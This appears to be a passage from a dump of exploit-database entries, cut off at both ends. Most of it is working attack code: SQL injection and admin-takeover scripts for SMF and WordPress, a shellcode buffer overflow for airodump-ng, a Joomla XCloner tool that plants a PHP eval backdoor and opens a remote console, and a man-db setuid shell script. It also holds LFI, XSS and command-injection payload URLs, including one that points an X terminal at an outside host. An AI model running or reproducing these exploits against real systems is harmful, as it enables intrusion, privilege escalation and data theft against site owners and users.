sys import argv, exit from httplib import HTTPConnection from urllib import urlencode, unquote from time import sleep print """""" #=================================================================# #  	           Simple Machines Forum <= 1.1.4                 # #                    Sql Injection Vulnerability                  # #                   Priviledge Escalation Exploit                 # #                                                                 # #               ######################################            # #               #  Let's get administrator rights!!! #            # #               ######################################            # #                                                                 # #                     Discovered By The:Paradox                   # #                                                                 # # Usage:                                                          # #  ./Exploit [Target] [Path] [PHPSessID] [Userid]                 # #                                                                 # # Example:                                                        # #  ./Exploit 127.0.0.1 /SMF/ a574bfe34d95074dea69c00e38851722 9   # #  ./Exploit www.host.com / 11efb3b6031bc79a8dd7526750c42119 36   # #=================================================================# """"""   if len(argv)<=4: exit()   sn = ""PHPSESSID"" # Session cookie name. You may have to change this. port = 80  target = argv[1] path = argv[2] sv = argv[3] uid = argv[4]   class killsmf: 	 	def __init__(self): 		 		print ""[.] Exploit Starts."" 	 		self.GetSesc() 		self.CreateLabels() 		self.Inject()  	 		print ""[+] All done.\n Now user with ID_MEMBER "" + uid + "" should have administrator rights. \n -= Paradox Got This One =-"" 	 	def GetSesc(self): 		 		print ""[+] Trying to read Sesc""	 	 		for i in range (0,2):  				conn = HTTPConnection(target,port) 				conn.request(""GET"", path + ""index.php?action=pm;sa=manlabels;"", {}, {""Accept"": ""text/plain"",""Cookie"": sn + ""="" + sv + "";""}) 				rsp = conn.getresponse() 				r = rsp.read()  		if rsp.status == 404:  				exit (""[-] Error 404. Not Found"") 		elif r.find('<input type=""hidden"" name=""sc"" value=""') != -1 and r.find('"" />') != -1 :  				self.sesc = r.split('<input type=""hidden"" name=""sc"" value=""')[1].split('"" />')[0]  				if len(self.sesc) != 32: exit (""[-] Invalid Sesc"") 				print ""[+] Sesc has been successfully read ==> ""+self.sesc  		else:  				exit (""[-] Unable to find Sesc"")  	def CreateLabels(self): 		print ""[+] Creating three labels..."" 		for i in range (0,3):  				conn = HTTPConnection(target,port) 				conn.request(""POST"", path + ""index.php?action=pm;sa=manlabels;sesc=""+self.sesc, urlencode({""label"" : i, ""add"" : ""Add+New+Label""}), {""Accept"": ""text/plain"",""Content-type"": ""application/x-www-form-urlencoded"",""Referer"": ""http://"" + target + path + ""/index.php?action=pm;sa=manlabels"", ""Cookie"": sn + ""="" + sv + "";""}) 				sleep(0.35) 	def Inject(self): 		print ""[+] Sql code is going to be injected."" 		conn = HTTPConnection(target,port) 		conn.request(""POST"", path + ""index.php?debug;action=pm;sa=manlabels;sesc=""+self.sesc, urlencode({""label_name[0]"" : ""o rly"" + unquote(""%a3%27""),""label_name[1]"" : ""ID_GROUP=1 WHERE/*"", ""label_name[2]"" : ""*/ID_MEMBER="" + uid + ""/*"", ""save"" : ""Save"", ""sc"" : self.sesc, ""db_character_set"": ""big5""}), {""Accept"": ""text/plain"",""Content-type"": ""application/x-www-form-urlencoded"",""Referer"": ""http://"" + target + path + ""/index.php?action=pm;sa=manlabels"", ""Cookie"": sn + ""="" + sv + "";""})  killsmf()	  # milw0rm.com [2008-06-15]",Simple Machines Forum (SMF),1
38275,"Microsoft Windows Kernel - Bitmap Handling Use-After-Free (MS15-061) (1) Source: https://code.google.com/p/google-security-research/issues/detail?id=293  Platform: Win7 32-bit. trigger.cpp should fire the issue, with two caveats: - PoC will NOT work if compiled as a debug build. - PoC will trigger the condition every time but the subsequent corruption might not cause a crash every time. It may be necessary to run the PoC multiple times.  debug.txt is a sample crash log.  Analysis from Nils:  --- Using the series of calls we are able to free the bitmap object, a reference to this object still exists in the trigger process after killing the first notepad process.  At this time we are able to replace the freed object in memory. We are not able to reuse this object through the original handle, however another free is triggered when quitting the trigger process, which will decrement the reference counter on the freed or replaced object, either modifying heap metadata or freeing the object which was allocated in the place of the original bitmap object. ---  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/38275.zip",Microsoft Windows Kernel,1
3039,"EasyNews PRO News Publishing 4.0 - Password Disclosure => EasyNews PRO News Publishing 4.0 Remote Password Disclosure Vulnerability <=    => Affected Software: Easy News 4.0 PRO  => Risk: Critical  => Download: http://www.stphp.com/scripts/EasyNews_PRO_4_0.zip  => Bugfounder: bd0rk  => Contact: bd0rk[at]hackermail.com  => Greets: str0ke, crashovernight, TheJT, Kacper     Usage: http://[target]/[easy_news_path]/newsboard/data/users.txt  # milw0rm.com [2006-12-29]",EasyNews PRO News Publishing,1
19303,"SGI IRIX 6.4 - cgi-bin handler source: https://www.securityfocus.com/bid/380/info  A vulnerability exists in the cgi-bin program 'handler', as included by Silicon Graphics in their Irix operating system. This vulnerability will allow a remote attacker to execute arbitrary commands on the vulnerable host as the user the web server is running as. This can easily result in a user being able to access the system.  telnet target.machine.com 80 GET /cgi-bin/handler/whatever;cat /etc/passwd| ?data=Download HTTP/1.0  or:  telnet target.machine.com 80 GET /cgi-bin/handler/blah;/usr/sbin/xwsh -display yourhost.com|?data=Download  NOTE: large spaces are actually tabs.",SGI IRIX,1
3724,"Aircrack-NG 0.7 - 'Specially Crafted 802.11 Packets' Remote Buffer Overflow /**  * airodump-exp.c - aircrack/airodump-ng (0.7) remote exploit  *  * Proof of concept exploit for a stack (and heap) based  * overflow in airodump-ng.  The vulnerability can be exploited  * by transmitting some specially crafted 802.11 packets to  * execute arbitrary code on any machines within range  * that are sniffing with a vulnerable version of airodump-ng.  *  * This exploit requires the lorcon 802.11 packet injection  * library, see http://802.11ninja.net for details.  *  * Compiling:  *  *   gcc -o airodump-remote airodump-remote.c -lorcon  *  * Usage:  *  *   ./airodump-ng <interface> <driver> <channel> <headertype> [return addr]  *  * Drivers supported by lorcon:  *  *   wlan-ng, hostap, airjack, prism54, madwifing, madwifiold,  *   rtl8180, rt2570, rt2500, rt73, rt61, zd1211rw  *  * Header types:  *  *   0 - None (not tested)  *   1 - Fake prism54 header  *   2 - Fake radiotap header (not tested)  *  * Return addresses:  *  *   Backtrack Linux 2 (2.6.20) aircrack-ng 0.7 - 0x8054934  *   Gentoo Linux (2.6.16) aircrack-ng 0.7 - 0x8055934  *  * Example usage:  *  *   ./airodump-ng wlan0 prism54 11 1 0x8054934  *  * Original advisory: http://www.nop-art.net/advisories/airodump-ng.txt  * Author: Jonathan So [ jonny [ @ ] nop-art.net ]  *  * Copyright (C) 2007 Jonathan So  */  #include <stdio.h> #include <stdlib.h> #include <tx80211.h>  // Linux x86 sys_write shellcode.  Any arbitrary shellcode should work // here, it doesn't matter if it contains nulls.  Maximum 792 bytes.  char shellcode[] = ""\xeb\x14""                      // jmp get_message                                                   // start:                  ""\x59\x31\xdb\x31\xd2\xb2""                  ""\x1b""                          // message length                  ""\x31\xc0\x88\x04\x11""                  ""\xb0\x04\xcd\x80""              // sys_write                  ""\xb0\x01\xcd\x80""              // sys_exit                                                   // get_message:                  ""\xe8\xe7\xff\xff\xff""          // call start                  ""Stop sniffing our network!!"";  // message text  int main(int argc, char **argv) {   tx80211_t tx;   tx80211_packet_t txp;   uint8_t packet[1044];   uint8_t *ppacket;    int headertype;   unsigned ret_addr = 0x8054934;   FILE *fp;    if(argc<5) {       printf(""usage: %s <interface> <driver> <channel> <arptype> [ret_addr]\n"", argv[0]);       exit(1);   }    if(argc>5) {       ret_addr = strtoul(argv[5], NULL, 16);   }    headertype = atoi(argv[4]);    if ( tx80211_init(&tx, argv[1], tx80211_resolvecard(argv[2])) != TX80211_ENOERR) {       fprintf(stderr, ""Error initializing driver"");       return 1;   }    if (tx80211_setfunctionalmode(&tx, TX80211_FUNCMODE_INJMON) != TX80211_ENOERR) {       fprintf(stderr, ""Error setting inject mode\n"");       return 1;   }    if (tx80211_setchannel(&tx, atoi(argv[3])) < 0) {               fprintf(stderr, ""Error setting channel\n"");   }    if (tx80211_open(&tx) < 0) {       fprintf(stderr, ""Unable to open interface\n"");       return 1;   }    txp.packet = packet;    // Fill packet with nops   memset(packet, 0x90, sizeof(packet));    switch (headertype) {       case 0:           // No arptype, just send raw packet           ppacket = packet;           break;       case 1:           // Send fake prism header           memcpy(packet+4, ""\x08\x00\x00\x00"", 4);           ppacket = packet + 8;           break;       case 2:           // Send fake radiotap header           packet[0] = 0;           packet[2] = 3;           ppacket = packet + 3;           break;       default:           printf(""Invalid header type. Valid options are:\n"");           printf(""  0 - none\n"");           printf(""  1 - prism54\n"");           printf(""  2 - radiotap\n"");           return 1;   }    // set some necessary 802.11 header fields   ppacket[0] = 0xB0;   ppacket[1] = 0;   ppacket[24] = 1;   ppacket[25] = 0;   ppacket[26] = 2;   ppacket[27] = 0;    txp.plen = 512 + (ppacket - packet);   if (tx80211_txpacket(&tx, &txp) < txp.plen) {       fprintf(stderr, ""Error sending packet 1\n"");       return 1;   }    ppacket[26] = 4;    if (tx80211_txpacket(&tx, &txp) < txp.plen) {       fprintf(stderr, ""Error sending packet 2\n"");       return 1;   }    // Insert shellcode at end of nopsled   memcpy(ppacket+(820-sizeof(shellcode)), shellcode, sizeof(shellcode));    // Overwrite some char*, needs to be a valid address   memcpy(ppacket+1028, &ret_addr, 4);    // Overwrite global variable sk_len, used as argument to memcpy   memcpy(ppacket+1032, ""\x20\x05\x00\x00"", 4);    // Return address   memcpy(ppacket+820, &ret_addr, 4);    ppacket[1] = 0x40;   txp.plen = 1036 +  + (ppacket - packet);    if (tx80211_txpacket(&tx, &txp) < txp.plen) {       fprintf(stderr, ""Error sending packet 3\n"");       return 1;   }    tx80211_close(&tx);    return 0; }  // milw0rm.com [2007-04-12]",Aircrack-NG,1
16246,"Joomla! Component com_xcloner-backupandrestore - Remote Command Execution #!/usr/bin/python # # Joomla component (com_xcloner-backupandrestore) remote code execution exploit  # Vendor: http://www.xcloner.com/ # # ""Our true divinity is in our ability to create. And armed with the understanding of the symbiotic connections # of life, while being guided by the emergent nature of reality, there is nothing we cannot do or accomplish.""  # - Zeitgeist addendum #  # Target Environment Settings: # ============================ # register_globals = On/Off (doesnt matter) # # Description: # ============ # XCloner is a Website Backup and Restore application designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!.  # XCloner design was specifically created to Generate custom backups of any LAMP website through custom admin inputs, and to be able to Restore  # the clone on any other location with the help of the automatic Restore script we provide, independent from the main package! #  # XCloner Backup tool uses Open Source standards like TAR and Mysql formats so you can rest assured your backups can be restored in a variety  # of ways, giving you more flexibility and full control. #  # Vulnerability List (wordpress/joomla) & Explanation: # ==================================================== # Here is the list of pre - auth vulns o.O: #  # Information Disclosure with phpinfo() # http://[target]/[path]/wp-content/plugins/xcloner-backup-and-restore/restore/XCloner.php?task=info # http://[target]/[path]/administrator/components/com_xcloner-backupandrestore/restore/XCloner.php?task=info # # Local File Inclusion: # http://[target]/[path]/wp-content/plugins/xcloner-backup-and-restore/cloner.cron.php?config=../../../../../../../../etc/passwd # http://[target]/[path]/administrator/components/com_xcloner-backupandrestore/cloner.cron.php?config=../../../../../../../../etc/passwd # # DoS/damage by calling unlink() on wordpress/joomla files: # http://[target]/[wp path]/wp-content/plugins/xcloner-backup-and-restore/restore/XCloner.php?task=step2&output_path=[path]/[file] # http://[target]/[path]/administrator/components/com_xcloner-backupandrestore/restore/XCloner.php?task=step2&output_path=[path]/[file] # # XSS: # http://[target]/[path]/wp-content/plugins/xcloner-backup-and-restore/index2.php?option=com_cloner&mosmsg=<script>alert(document.cookie)</script> # http://[target]/[path]/wp-content/plugins/xcloner-backup-and-restore/index2.php?username=adsc&password=dac&option=com_cloner # "";alert(document.cookie)//&task=dologin&boxchecked=0&hidemainmenu=0 # http://[target]/[path]/administrator/components/com_xcloner-backupandrestore/index2.php?option=com_cloner&mosmsg= # <script>alert(document.cookie)</script> # # Not to mention the post - auth bugs...... but the most potent, pre-auth rce (joomla only). Enough yip yap, here we go.... # # By accessing the XCloner.php page, the webmaster is presented an important message: ""Security Note: After restore delete the  # XCloner.php script from your server"". So my understanding is that the vulnerable code in this file, is sitting on web servers  # without requiring authentication to access until a restore happens. o.O. Below is an explanation of the vulnerable code, sorry but  # this is going to be long: #  # The XCloner.php script begins by setting the array element 'output_path' of $_CONFIG to our input on line 72: #  # $_CONFIG['output_path'] = $_REQUEST['output_path']; #  # Later on we see a simple switch on lines 134-150 on our task parameter # # switch ($_REQUEST[task]) { #    case 'step2': #         step2(); #         break; # # We follow the case ""step2"" switch and land into that function (step2()) defined on lines 178-?. Inside that function we set the  # $_CONFIG array to global. The attacker must make sure that they DO NOT set the 'DBcreated' or 'transfer_mode' variable to 'on' or '2'  # (respectively) as it will kill our script when if it fails to connect to the database or FTP server. This is important to note,  # you will see later on. # # function step2($file=""""){ #   #     global $_CONFIG,$filepath ; #     $DBcreated    = $_REQUEST[DBcreated]; #   #     if ($DBcreated=='on'){ #  #	-- snip -- # #         $db = @mysql_connect($DBhostname, $DBuserName, $DBpassword) or die(""<br />The database details provided are incor... blah blah #  #	-- snip -- #  # if($_REQUEST[transfer_mode]==2){ #   #	-- snip -- #  #        // set up basic connection #        $conn_id = @ftp_connect($_REQUEST[ftp_server], $_REQUEST[ftp_port]) or die(""<span class='error'>Could not connect to .. blah blah # # We keep looking and we see something interesting on lines 473 - 483 #  #     if(($_REQUEST['do_database'] != 1) || ($_REQUEST['files_skip'] == 1)){ #         $config_file = $_CONFIG[output_path].""/configuration.php""; #         @chmod($config_file,0777); #         @unlink($_CONFIG[output_path].""/administrator/backups/perm.txt""); #         if(($_CONFIG['sql_usefile'] == ""database-sql.sql"") and ($update_config)) #             if(write_config($config_file)){ #                 echo ""<H2>Configuration updated!</H2>""; #             }else{ #                 echo ""<span class='error'>Unable to write to configuration file $config_file... Aborting...</span>"";return; #             } #         } #  # So an attacker must ensure that our request does not contain any 'do_database' variable or have the 'files_skip' variable containing a  # value of '1'. If the attacker calls the configuration.php with a null byte (../../../../configuration.php%00) then the unlink() will be  # triggered and delete the config file we are trying to backdoor! So the attacker can specify the 'output_path' variable to  # '../../../../' instead and simply let the application append the 'configuration.php'. Now lets break down the call to write_config()  # which is defined at line 547  #  # function write_config($file){ # echo ""made it here""; #     if(@$fp = fopen($file, ""r"")){ #         $config_data = """"; #         while(!feof($fp)) #               $config_data .= fread($fp, 1024); #         fclose($fp); #     } #  # Ok so the script reads the file into $config_data variable. # #     if ($_REQUEST[DBcreated] == 'on'){ #   #         $config_data = str_replace(""define('DB_HOST', '"", ""define('DB_HOST', '"".$_REQUEST[mysql_server].""');#"", $config_data); #         $config_data = str_replace(""define('DB_USER', '"", ""define('DB_USER', '"".$_REQUEST[mysql_username].""');# #  #             -- snip -- #  #     if($_REQUEST['transfer_mode'] == 2){ #         $config_data = str_replace('$'.'ftp_host =',""$"".""ftp_host ='"".$_REQUEST[ftp_server].""';#"", $config_data); #         $config_data = str_replace('$'.'ftp_port =',""$"".""ftp_port ='"".$_REQUEST[ftp_port].""';#"", $config_ #  #             -- snip -- #  # Now if the 'DBcreated' variable is set to 'on' or the 'transfer_mode' variable is set to '2', the attacker can overwrite the configuration.php  # file with 'mysql_server', 'mysql_username' or 'ftp_server', 'ftp_port' variables etc. However, the beginning of the XCloner.php script will  # kill the execution simply because setting those values will force the code to make an authentication, fail (if credz are wrong) and then die. #  # if we keep looking, from line 585 we see: #  #     $config_data = str_replace('$'.'live_site =',""$"".""live_site ='"".$_REQUEST[output_url_pref].""://"".$_REQUEST[output_url].""';#"", $config_data); # #     if ($fp = fopen($file, ""w"")) { #         fwrite( $fp, $config_data); #         fclose( $fp ); #     } else { #         return false; #     } // if #  return true; # } #  # This is not part of the if statements like before, so the attacker at this point can simply overwrite the '$live_site' variable contained  # within configuration.php with 'malicious' code by setting the 'output_url_pref' variable accordingly. #  # Exploitation: # ============= # Seems to be that joomla and wordpress both have the vulnerable code in their plugins however only joomla uses the $live_site # variable in their configuration file. # # Simply set the backdoor in configuration.php against our target: # http://[target]/[path]administrator/components/com_xcloner-backupandrestore/restore/XCloner.php? # task=step2&output_url_pref=';+}+?>+<?php+eval($_GET['lol']);+?>&output_path=../../../../ # Execute our code: # http://[target]/[path]/?lol=phpinfo(); # http://[target]/[path]/?lol=system(""id""); # # [mr_me@pluto xcloner]$ python 0day.py -p localhost:8080 -t 192.168.1.3 -d /webapps/joomla/ #  # 	| ----------------------------------------------------------------------------- | # 	| Joomla component (com_xcloner-backupandrestore) remote code execution explo!t | # 	| by mr_me - net-ninja.net ---------------------------------------------------- | #  # (+) Testing proxy @ localhost:8080.. proxy is found to be working! # (+) Targeting http://192.168.1.3/webapps/joomla/ # (!) Exploit working! # (+) Droping to remote console (q for quit) #  # mr_me@192.168.1.3# id # uid=33(www-data) gid=33(www-data) groups=33(www-data) #  # mr_me@192.168.1.3# q  import sys import urllib import re import urllib2 import getpass import base64 from optparse import OptionParser  usage = ""./%prog [<options>] -t [target] -d [directory]"" usage += ""\nExample: ./%prog -p localhost:8080 -t 192.168.1.7 -d /joomla/""  parser = OptionParser(usage=usage) parser.add_option(""-p"", type=""string"",action=""store"", dest=""proxy"",                   help=""HTTP Proxy <server:port>"") parser.add_option(""-t"", type=""string"", action=""store"", dest=""target"",                   help=""The Target server <server:port>"") parser.add_option(""-d"", type=""string"", action=""store"", dest=""dirPath"",                   help=""Directory path to the CMS"")  (options, args) = parser.parse_args()  def banner(): 	print ""\n\t| ----------------------------------------------------------------------------- |"" 	print ""\t| Joomla component (com_xcloner-backupandrestore) remote code execution explo!t |"" 	print ""\t| by mr_me - net-ninja.net ---------------------------------------------------- |\n""  if len(sys.argv) < 5:     banner()     parser.print_help()     sys.exit(1)  def testProxy(): 	check = 1 	sys.stdout.write(""(+) Testing proxy @ %s.. "" % (options.proxy)) 	sys.stdout.flush() 	try:         	req = urllib2.Request(""http://www.google.com/"") 		req.set_proxy(options.proxy,""http"") 		check = urllib2.urlopen(req)     	except:         	check = 0         	pass     	if check != 0:         	sys.stdout.write(""proxy is found to be working!\n"")         	sys.stdout.flush()     	else:         	print ""proxy failed, exiting..""         	sys.exit(1)  def interactiveAttack():         print ""(+) Droping to remote console (q for quit)\n""         hn = ""%s@%s# "" % (getpass.getuser(), options.target)         preBaseCmd = """"         while preBaseCmd != 'q':                 preBaseCmd = raw_input(hn) 		preBaseCmdSetup = (""system(\""%s\"");"" % (preBaseCmd))                 cmdInBase64 = base64.b64encode(preBaseCmdSetup) 		cookieCmd = (""lol=%s;"" % (cmdInBase64))                 resp = getServerResponse(options.target + options.dirPath, cookieCmd, None) 		result = resp.split(""://"")[0] 		print result  def getServerResponse(exploit, header=None, data=None): 	try: 		headers = {} 		if header != None: 			headers['Cookie'] = header 		if data != None: 			data = urllib.urlencode(data) 		req = urllib2.Request(""http://""+exploit, data, headers) 		if options.proxy: 			req.set_proxy(options.proxy,""http"") 		check = urllib2.urlopen(req).read()			 	except: 		check = error.read() 	return check  def backdoorTarget(): 	print ""(+) Targeting http://%s%s"" % (options.target, options.dirPath) 	phpShell = ""'; } ?> <?php eval(base64_decode($_COOKIE['lol'])); ?>"" 	backdoorReq = (""administrator/components/com_xcloner-backupandrestore/restore/XCloner.php"") 	data = {'task':'step2', 'output_url_pref':phpShell, 'output_path':'../../../../'} 	req = options.target + options.dirPath + backdoorReq 	check = getServerResponse(req, None, data)  	if re.search(""All should be done! Click here to continue..."", check): 		print ""(!) Exploit working!"" 		interactiveAttack() 	else: 		print ""(-) Exploit failed, exiting.."" 		sys.exit(1)  def main(): 	banner() 	if options.proxy: 		testProxy() 	backdoorTarget()  if __name__ == ""__main__"": 	main()",Joomla! Component,1
39053,"Adobe Flash TextField.text Setter - Use-After-Free Source:  https://code.google.com/p/google-security-research/issues/detail?id=576  There is a use-after-free in the TextField.text setter. If the text the field is set to is an object with toString defined, the toString function can free the field's parent object, which is then used. A minimal PoC is as follows:  var mc = this.createEmptyMovieClip(""mc"", 101); var tf = mc.createTextField(""tf"", 102, 1, 1, 100, 100); tf.text = {toString : func};  function func(){  	mc.removeMovieClip();          // Fix heap here  	return ""natalie""; 	 	}  A sample swf and fla are attached.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39053.zip",Adobe Flash TextField.text Setter,1
6995,"phpBB Mod Small ShoutBox 1.4 - Remote Edit/Delete Messages /*     --------------------------------------------------------------     phpBB Mod Small ShoutBox 1.4 Remote Edit/Delete Messages Vuln     --------------------------------------------------------------     Discovered By StAkeR[at]hotmail[dot]it     Download On http://www.phpbbhacks.com/load.php?id=1595     NOTE:  Works Regardless PHP.ini Settings!     Thanks darkjoker     --------------------------------------------------------------          File (shoutbox_view.php)               50. $id = ( isset($HTTP_GET_VARS['id']) ) ? $HTTP_GET_VARS['id'] : $HTTP_POST_VARS['id'];                    168. if ( $mode == ""delete"" && $adel )     169. {     170.   $sql = ""DELETE FROM "" . SHOUTBOX_TABLE . ""     171.   WHERE id = $id $del_mod"";     172. if( !($result = $db->sql_query($sql)) )     173. { message_die(GENERAL_ERROR, 'Could not delete shoutbox message', '', __LINE__, __FILE__, $sql); }     174.               - Delete All Messages     - shoutbox_view.php?mode=delete&id=-1 or 1=1/*          - Edit Message / Post Message     - shoutbox_view.php?mode=edit&id=-1 or 1=1/*&name_id=1 or 1=1/*&date_edit=1225915829&name_edit=[NICKNAME]&clean_msg=[MESSAGE]               - Blind SQL Injection     - phpBB2/shoutbox_view.php?mode=delete&id=[Query]     */     # milw0rm.com [2008-11-05]",phpBB Mod Small ShoutBox,1
75,"man-db 2.4.1 - 'open_cat_stream()' Local uid=man #!/bin/bash # xmandb.sh: shell command file. # # man-db[v2.4.1-]: local uid=man exploit. # by: vade79/v9 v9 fakehalo deadpig org (fakehalo) # # open_cat_stream() privileged call exploit. # # i've been conversing with the new man-db maintainer, and after the # initial post sent to bugtraq(which i forgot to inform him), i sent him # an email highlighting another vulnerability i forgot to mention in the # original advisory. # # once he checked it out, he noticed that the routine never dropped # privileges before/after the potential buffer/elemental overflow occured, # and executed the (user defined) ""compressor"" binary.  making it # pointless to exploit this via the overflow method, and all-purpose to # exploit this via the privileged execve() call method. # # best of luck to the new maintainer(Colin Watson<cjwatson debian org>), # he noticed it before i did, so he's on the right track. :) # # example: #  [v9@localhost v9]$ id #  uid=500(v9) gid=500(v9) groups=500(v9) #  [v9@localhost v9]$ ./xmandb.sh #  [*] making fake manpage directories/files... #  [*] making runme, and mansh source files... #  [*] compiling runme source... #  [*] setting ""compressor"" to: /tmp/runme... #  [*] executing man-db/man... #  [*] cleaning up files... #  [*] success, entering shell. #  -rws--x---    1 man      v9          13963 Jun 13 20:09 /tmp/mansh #  sh-2.04$ id #  uid=15(man) gid=500(v9) groups=500(v9) #  sh-2.04$  # # (tested on redhat7.1, from src, should work out of the box everywhere)  MANBIN=/usr/bin/man MANDIR=man_x TMPDIR=/tmp echo ""man-db[v2.4.1-]: local uid=man exploit."" echo -e ""by: vade79/v9 v9 fakehalo deadpig org (fakehalo)\n"" if [ ! ""`$MANBIN -V 2>/dev/null`"" ] then  echo ""[!] \""$MANBIN\"" does not appear to be man-db, failed.""  exit fi umask 002 cd $TMPDIR echo ""[*] making fake manpage directories/files..."" mkdir $MANDIR ${MANDIR}/man1 ${MANDIR}/cat1 touch ${MANDIR}/man1/x.1 echo ""[*] making runme, and mansh source files..."" cat <<EOF>runme.c #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> int main(int argc,char **argv){  setreuid(geteuid(),geteuid());  system(""cc ${TMPDIR}/mansh.c -o ${TMPDIR}/mansh"");  chmod(""${TMPDIR}/mansh"",S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);  unlink(argv[0]);  exit(0); } EOF cat <<EOF>mansh.c #include <stdio.h> #include <sys/types.h> #include <unistd.h> int main(){  setreuid(geteuid(),geteuid());  execl(""/bin/sh"",""sh"",0);  exit(0); } EOF echo ""[*] compiling runme source..."" cc runme.c -o runme echo ""[*] setting \""compressor\"" to: ${TMPDIR}/runme..."" echo ""DEFINE compressor ${TMPDIR}/runme"">~/.manpath echo ""[*] executing man-db/man..."" $MANBIN -M ${TMPDIR}/$MANDIR -P /bin/true x 1>/dev/null 2>&1 echo ""[*] cleaning up files..."" rm -rf $MANDIR mansh.c runme.c runme ~/.manpath if test -u ""${TMPDIR}/mansh"" then  echo ""[*] success, entering shell.""  ls -l ${TMPDIR}/mansh  ${TMPDIR}/mansh else  echo ""[!] exploit failed.""  rm -rf ${TMPDIR}/mansh fi exit   // milw0rm.com [2003-08-06]",man-db/man,1
5303,"PowerPHPBoard 1.00b - Multiple Local File Inclusions [DSECRG-08-021] Digital Security Research Group [DSecRG] Advisory   Application:                    PowerPHPBoard Versions Affected:              1.00b Vendor URL:                     http://www.powerscripts.org/ Bug:                            Multiple Local File Include Exploits:                       YES Reported:                       01.02.2008 Vendor Response:                none Solution:                       none Date of Public Advisory:        24.03.2008 Author:                         Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)    Description ***********  PowerPHPBoard has Multiple Local File Include vulnerabilities.   1. Local File Include vulnerability found in script footer.inc.php  To exploit this vulnerability REGISTER_GLOBALS option must be ON in php config file.   Code **** #################################################     if ($settings[footer]) {     if (file_exists(""inc/$settings[footer]"")) {       include(""inc/$settings[footer]"");     } else {       echo ""<center>$lang_footerdoesntexists</center>"";     }   } else {     include(""inc/footer.ppb"");   }  #################################################   Example:  http://[server]/[installdir]/footer.inc.php?settings[footer]=../../../../../../../../../../../../../etc/passwd  ---------------------------------------------------------------------   2. Local File Include vulnerability found in script footer.inc.php  To exploit this vulnerability REGISTER_GLOBALS option must be ON in php config file.   Code **** #################################################    if (!$handler) {     if ($handler = @mysql_pconnect($mysql[server], $mysql[user], $mysql[password])) {     ...     }   }  ...    $query = ""SELECT * FROM ppb_config WHERE id='1'"";   $result = mysql_query($query,$handler);   $num = mysql_num_rows($result);    if ($num != 0) {     list($settings[id], $settings[boardtitle], $settings[boardurl], $settings[adminemail], $settings[header], $settings[footer], $settings[bordercolor], $settings[tablebg1], $settings[tablebg2], $settings[tablebg3], $settings[htmlcode], $settings[bbcode], $settings[smilies], $settings[newthread], $settings[newpost], $settings[language]) = mysql_fetch_array($result);   }  ...    if ($settings[header]) {     if (file_exists(""inc/$settings[header]"")) {       include(""inc/$settings[header]"");     } else {       echo ""<center>$lang_headerfiledoesntexists</center>"";     }   } else {     include(""inc/header.ppb"");   }  #################################################   Example:  http://[server]/[installdir]/header.inc.php?handler=1234&settings[header]=../../../../../../../../../../../../../etc/passwd   About *****  Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.  # milw0rm.com [2008-03-24]",PowerPHPBoard,1
6421,"WordPress Core 2.6.1 - Admin Takeover (SQL Column Truncation) #!/usr/bin/php <?php # ------------------------------------------------------------ # quick'n'dirty wordpress admin-take0ver poc # by iso^kpsbr in august 2oo8  # # works w/ wordpress 2.6.1 # #         .oO( private -- do not spread! )Oo. # # you'll have to make sure you run roughly the same # php version as on the server, that is: if server # is >=5.2.1 you'll need to be as well, in case # server is <5.2.1, your php also needs to be below. # to make sure it works you'll need the exact same version! # also, mod_php works better than (f)cgi.. # (this is a first working version - not a very reliable one) # # you should create rainbow tables to make this work in a # real world scenario: # php-5.2.0/php createtables.php > wp261_php520 # php-5.2.1/php createtables.php > wp261_php521 # #-------------------------------------------------------------  	$BLOG = $_SERVER['argv'][1];  	echo ""[+] w0rdpress 2.6.1. admin takeover, iso 0808\n"";  	if(!$BLOG) { 		echo ""[!] Usage: "".$_SERVER['argv'][0]."" blogurl\n""; 		echo ""    fe: "".$_SERVER['argv'][0]."" http://31337.biz/blog\n""; 		exit; 	}  	$UA = ""WordpressAdminTakeover""; 	$MBOX=""wp"".`ps|md5sum|head -c 8`; 	$EMAIL=""$MBOX@nospamfor.us"";  	echo (file_exists('wp261_php520') && file_exists('wp261_php521')) ? 			""[X] rainbow tables available\n"" : 			""[!] rainbow tables not found - this will be really slow\n"";  	set_time_limit(0); 	ini_set(""max_execution_time"",0); 	ini_set(""default_socket_timeout"",20);  	if(!preg_match('!http://([^/]+)(.*)$!', $BLOG, $match)) { 		die(""[!] $BLOG is no valid URL\n""); 	}  	$HOST = $match[1]; 	$PATH = $match[2]; 	if(!$PATH) $PATH='/';  	echo ""[-] registering new admin user\n""; 	$suck = fsockopen($HOST, 80) or die(""[!] could not connect to $HOST:80\n""); 	$data = ""user_login=admin"".str_repeat(""%20"",60).""x&user_email=$EMAIL""; 	$req = ""POST $PATH/wp-login.php?action=register HTTP/1.1\r\nHost: $HOST\r\nUser-Agent: $UA\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "".strlen($data).""\r\n\r\n"".$data; 	fputs($suck, $req); 	sleep(1); 	fclose($suck);  	echo ""[-] requesting resetlink and mail to '$EMAIL'\n""; 	$suck = fsockopen($HOST, 80) or die(""[!] could not connect to $HOST:80\n""); 	$data=""user_login=$EMAIL&wp-submit=Get+New+Password"";	 	$req = ""POST $PATH/wp-login.php?action=lostpassword HTTP/1.1\r\nHost: $HOST\r\nReferer: $BLOG/wp-login.php?action=lostpassword\r\nConnection: keep-alive\r\nKeep-Alive: 300\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "".strlen($data).""\r\n\r\n"".$data.""\r\n""; 	fputs($suck, $req);  	echo ""[.] giving $BLOG some time to deliver mail..\n""; 	for($i=0;$i<8;$i++) { 		fputs($suck,""GET / HTTP/1.1\r\nHost: $HOST\r\nConnection: keep-alive\r\nKeep-Alive: 300\r\n\r\n""); 		sleep(2); 	}  	echo ""[-] fetching resetlink token $MBOX\n""; 	$PAGE = file_get_contents(""http://www.nospamfor.us/mailbox.php?mailbox=$MBOX&sitename=nospamfor.us""); 	